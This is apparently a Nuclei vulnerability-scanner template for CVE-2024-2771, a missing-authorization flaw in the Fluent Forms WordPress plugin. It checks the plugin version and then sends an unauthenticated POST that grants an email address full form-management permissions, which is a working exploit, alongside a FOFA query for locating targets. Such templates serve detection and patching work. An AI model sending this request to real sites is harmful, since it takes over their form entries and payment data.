flow: http(1) || http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: version
    part: body
    regex:
    - 'Stable tag: ([0-9.]+)'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - compare_versions(version, '< 5.1.17')
    type: dsl
  raw:
  - 'GET /wp-content/plugins/fluentform/readme.txt HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, 'Manager has been saved.','{{email}}')
    - contains(content_type, 'application/json')
    type: dsl
  raw:
  - "POST /wp-json/fluentform/v1/managers HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\nAccept-Encoding: gzip, deflate, br\n\n{\n  \"manager\": {\n\
    \  \"email\": \"{{email}}\",\n  \"permissions\": [\n\"fluentform_dashboard_access\"\
    ,\n\"fluentform_forms_manager\",\n\"fluentform_entries_viewer\",\n\"fluentform_manage_entries\"\
    ,\n\"fluentform_view_payments\",\n\"fluentform_manage_payments\",\n\"fluentform_settings_manager\"\
    ,\n\"fluentform_full_access\"\n]\n}\n}\n"
id: CVE-2024-2771
info:
  author: Sourabh-Sahu
  classification:
    cpe: cpe:2.3:a:fluentforms:contact_form:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2024-2771
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-862
    epss-percentile: 0.96431
    epss-score: 0.2943
  description: 'The plugin is vulnerable to privilege escalation due to a missing
    capability check on the /wp-json/fluentform/v1/managers REST API endpoint. This
    makes it possible for unauthenticated attackers to grant users with Fluent Form
    management permissions which gives them access to all of the plugin''s settings
    and features. This also makes it possible for unauthenticated attackers to delete
    manager accounts.

    '
  impact: 'Unauthenticated attackers can grant Fluent Form management permissions
    to any user account, providing access to all plugin settings and sensitive data.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/fluentform/"
    framework: wordpress
    max-request: 1
    product: contact_form
    vendor: fluentforms
    verified: true
  name: Contact Form Plugin by Fluent Forms < 5.1.17 - Unauthenticated Limited Privilege
    Escalation
  reference:
  - https://github.com/whale93/CVE-2024-2771-PoC
  - https://nvd.nist.gov/vuln/detail/CVE-2024-2771
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/071195d6-3452-4241-a8d3-92efc84e4850?source=cve
  remediation: 'Update Contact Form Plugin by Fluent Forms to version 5.1.17 or later.

    '
  severity: critical
  tags: cve,cve2024,wordpress,fluentforms,wp-plugin,unauth,wp,vkev,vuln
